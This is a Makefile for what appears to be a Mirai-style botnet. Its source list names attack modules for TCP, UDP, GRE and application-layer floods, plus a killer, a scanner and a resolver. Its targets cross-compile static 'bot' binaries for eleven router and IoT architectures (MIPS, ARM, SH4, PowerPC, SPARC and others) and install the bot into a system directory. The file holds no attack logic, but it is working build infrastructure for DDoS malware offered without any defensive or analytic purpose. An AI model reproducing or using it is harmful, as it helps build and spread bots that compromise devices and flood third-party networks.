# Default compiler (host system)
CC = gcc
CFLAGS = -Wall -Wextra -O2 -std=c99 -D_GNU_SOURCE -DDEBUG -g
LDFLAGS = -lpthread

# Cross-compiler directory
CROSS_COMPILER_DIR = /etc/xcompiler

# Source files
SOURCES = main.c attack.c attack_app.c attack_gre.c attack_tcp.c attack_udp.c buff.c checksum.c killer.c rand.c resolv.c scanner.c table.c util.c
HEADERS = includes.h attack.h buff.h checksum.h killer.h protocol.h rand.h resolv.h scanner.h table.h util.h

# Output binary
TARGET = bot

# Default target
all: $(TARGET)

# Compile the bot for host system
$(TARGET): $(SOURCES) $(HEADERS)
	@echo "Compiling bot for host system..."
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCES) $(LDFLAGS)
	@echo "Bot compiled successfully: $(TARGET)"

# Cross-compilation targets
cross-i586: 
	@echo "Cross-compiling for i586..."
	$(CROSS_COMPILER_DIR)/i586/bin/i586-gcc $(CFLAGS) -static -o bot.i586 $(SOURCES) $(LDFLAGS)
	@echo "i586 bot compiled: bot.i586"

cross-mips:
	@echo "Cross-compiling for mips..."
	$(CROSS_COMPILER_DIR)/mips/bin/mips-gcc $(CFLAGS) -static -o bot.mips $(SOURCES) $(LDFLAGS)
	@echo "mips bot compiled: bot.mips"

cross-mipsel:
	@echo "Cross-compiling for mipsel..."
	$(CROSS_COMPILER_DIR)/mipsel/bin/mipsel-gcc $(CFLAGS) -static -o bot.mipsel $(SOURCES) $(LDFLAGS)
	@echo "mipsel bot compiled: bot.mipsel"

cross-armv4l:
	@echo "Cross-compiling for armv4l..."
	$(CROSS_COMPILER_DIR)/armv4l/bin/armv4l-gcc $(CFLAGS) -static -o bot.armv4l $(SOURCES) $(LDFLAGS)
	@echo "armv4l bot compiled: bot.armv4l"

cross-armv5l:
	@echo "Cross-compiling for armv5l..."
	$(CROSS_COMPILER_DIR)/armv5l/bin/armv5l-gcc $(CFLAGS) -static -o bot.armv5l $(SOURCES) $(LDFLAGS)
	@echo "armv5l bot compiled: bot.armv5l"

cross-armv6l:
	@echo "Cross-compiling for armv6l..."
	$(CROSS_COMPILER_DIR)/armv6l/bin/armv6l-gcc $(CFLAGS) -static -o bot.armv6l $(SOURCES) $(LDFLAGS)
	@echo "armv6l bot compiled: bot.armv6l"

cross-armv7l:
	@echo "Cross-compiling for armv7l..."
	$(CROSS_COMPILER_DIR)/armv7l/bin/armv7l-gcc $(CFLAGS) -static -o bot.armv7l $(SOURCES) $(LDFLAGS)
	@echo "armv7l bot compiled: bot.armv7l"

cross-m68k:
	@echo "Cross-compiling for m68k..."
	$(CROSS_COMPILER_DIR)/m68k/bin/m68k-gcc $(CFLAGS) -static -o bot.m68k $(SOURCES) $(LDFLAGS)
	@echo "m68k bot compiled: bot.m68k"

cross-powerpc:
	@echo "Cross-compiling for powerpc..."
	$(CROSS_COMPILER_DIR)/powerpc/bin/powerpc-gcc $(CFLAGS) -static -o bot.powerpc $(SOURCES) $(LDFLAGS)
	@echo "powerpc bot compiled: bot.powerpc"

cross-sh4:
	@echo "Cross-compiling for sh4..."
	$(CROSS_COMPILER_DIR)/sh4/bin/sh4-gcc $(CFLAGS) -static -o bot.sh4 $(SOURCES) $(LDFLAGS)
	@echo "sh4 bot compiled: bot.sh4"

cross-sparc:
	@echo "Cross-compiling for sparc..."
	$(CROSS_COMPILER_DIR)/sparc/bin/sparc-gcc $(CFLAGS) -static -o bot.sparc $(SOURCES) $(LDFLAGS)
	@echo "sparc bot compiled: bot.sparc"

# Build all cross-compiled versions
cross-all: cross-i586 cross-mips cross-mipsel cross-armv4l cross-armv5l cross-armv6l cross-armv7l cross-m68k cross-powerpc cross-sh4 cross-sparc
	@echo "All cross-compiled bots built successfully!"

# Clean build artifacts
clean:
	@echo "Cleaning build artifacts..."
	rm -f $(TARGET) bot.*
	@echo "Clean complete"

# Install bot to system
install: $(TARGET)
	@echo "Installing bot..."
	cp $(TARGET) /usr/local/bin/
	chmod +x /usr/local/bin/$(TARGET)
	@echo "Bot installed to /usr/local/bin/"

# Debug build
debug: CFLAGS += -DDEBUG -g
debug: $(TARGET)

# Release build
release: CFLAGS += -DNDEBUG -O3
release: $(TARGET)

# Show help
help:
	@echo "Available targets:"
	@echo "  all      - Build the bot (default)"
	@echo "  clean    - Remove build artifacts"
	@echo "  install  - Install bot to system"
	@echo "  debug    - Build with debug symbols"
	@echo "  release  - Build optimized release version"
	@echo "  help     - Show this help message"

.PHONY: all clean install debug release help
